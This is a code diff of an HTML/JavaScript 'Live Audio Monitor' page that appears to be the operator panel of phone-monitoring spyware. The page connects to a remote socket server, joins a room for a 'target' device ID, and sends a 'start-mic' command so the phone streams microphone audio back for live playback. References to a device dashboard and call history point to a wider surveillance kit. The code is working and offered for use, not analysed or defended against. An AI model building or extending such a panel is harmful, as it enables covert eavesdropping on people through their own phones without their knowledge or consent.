@@ -4,8 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Live Audio Monitor</title>
-    <script src="/socket.io/socket.io.js"></script> 
+    
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
     <style>
         :root { --accent: #00ff88; --bg: #0a0a0a; }
         body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; text-align: center; overflow: hidden; }
@@ -54,6 +57,7 @@
     </style>
 </head>
 <body>
+
     <div class="header">
         <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i> Back</a>
         <h3>Live Audio Stream</h3>
@@ -88,32 +92,36 @@
     </div>
 
     <script>
-        // 🔥 Server URL (Wahi jo Call History me tha)
+        // 🔥 Server URL Corrected
         const SERVER_URL = "https://child-v9no.onrender.com"; 
 
-        // 🔥 ID Logic (Bilkul Call History jaisa)
+        // 🔥 ID Get Logic
         const urlParams = new URLSearchParams(window.location.search);
-        const DEVICE_ID = urlParams.get('id'); // Ab ye link se ?id=WALA_ID uthayega
+        const DEVICE_ID = urlParams.get('id'); 
 
         let socket;
         let audioContext;
         let nextTime = 0;
         let isStreaming = false;
 
-        // 🔥 Page Load Check (Agar ID nahi hai to bhaga do)
+        // 🔥 Page Load Check
         window.onload = function() {
             if (!DEVICE_ID) {
-                alert("ID Missing! Please select a device first.");
-                window.location.href = "index.html"; // Wapas bhej do agar ID nahi hai
+                alert("ID Missing! Please select a device first from Dashboard.");
+                // window.location.href = "index.html"; // Commented out for testing
+                document.getElementById('targetDisplay').innerText = "NO ID FOUND";
                 return;
             }
             document.getElementById('targetDisplay').innerText = DEVICE_ID;
         };
 
         function connectAndListen() {
-            if (!DEVICE_ID) return;
+            if (!DEVICE_ID) {
+                alert("Error: No Device ID");
+                return;
+            }
 
-            // Audio Context Start
+            // 1. Audio Context Resume (Browser Policy)
             if (!audioContext) {
                 audioContext = new (window.AudioContext || window.webkitAudioContext)();
             }
@@ -125,15 +133,18 @@
             document.getElementById('statusText').style.color = "yellow";
 
             if(socket) socket.disconnect();
+            
+            // Connect to Socket
             socket = io(SERVER_URL);
 
             socket.on("connect", () => {
                 console.log("Connected to Server");
                 
-                // 🔥 ID wala Room Join karo
+                // 2. Room Join
                 socket.emit("join", DEVICE_ID);
                 
-                // Phone ko bolo Mic On kare
+                // 3. Command Send: Start Mic
+                console.log("Sending start-mic command...");
                 socket.emit("control-event", {
                     room: DEVICE_ID,
                     action: "start-mic"
@@ -146,9 +157,14 @@
                 isStreaming = true;
             });
 
-            socket.on("audio-stream", (arrayBuffer) => {
+            // 4. Receive Audio Data (Binary)
+            socket.on("audio-stream", (data) => {
                 if (!isStreaming) return;
-                playPcmChunk(arrayBuffer);
+                
+                // Debugging: Check karo data aa raha hai ya nahi
+                // console.log("Audio Chunk Received, Size:", data.byteLength); 
+                
+                playPcmChunk(data);
             });
 
             socket.on("disconnect", () => {
@@ -156,13 +172,16 @@
             });
         }
 
-        // --- AUDIO PLAYER ---
+        // --- AUDIO PLAYER LOGIC (PCM 16bit -> Web Audio) ---
         function playPcmChunk(arrayBuffer) {
             if (!audioContext) return;
+
+            // Raw PCM 16-bit to Float
             const int16Array = new Int16Array(arrayBuffer);
             const float32Array = new Float32Array(int16Array.length);
 
             for (let i = 0; i < int16Array.length; i++) {
+                // Normalize (-32768 to 32767) -> (-1.0 to 1.0)
                 float32Array[i] = int16Array[i] / 32768; 
             }
 
@@ -173,19 +192,21 @@
             source.buffer = audioBuffer;
             source.connect(audioContext.destination);
 
+            // Queue Audio (Taaki atke nahi)
             if (nextTime < audioContext.currentTime) {
                 nextTime = audioContext.currentTime;
             }
             source.start(nextTime);
             nextTime += source.buffer.duration;
+            
             animateBars();
         }
 
         function stopListen() {
             isStreaming = false;
             if (socket) {
-                // Mic Off Command
                 if(DEVICE_ID) {
+                    console.log("Sending stop-mic command...");
                     socket.emit("control-event", {
                         room: DEVICE_ID,
                         action: "stop-mic"
@@ -215,10 +236,12 @@
         }
 
         function animateBars() {
+            // Fake animation based on data arrival
             document.querySelectorAll('.bar').forEach(b => {
                 b.style.height = (Math.random() * 40 + 15) + "px";
             });
         }
     </script>
+
 </body>
 </html>
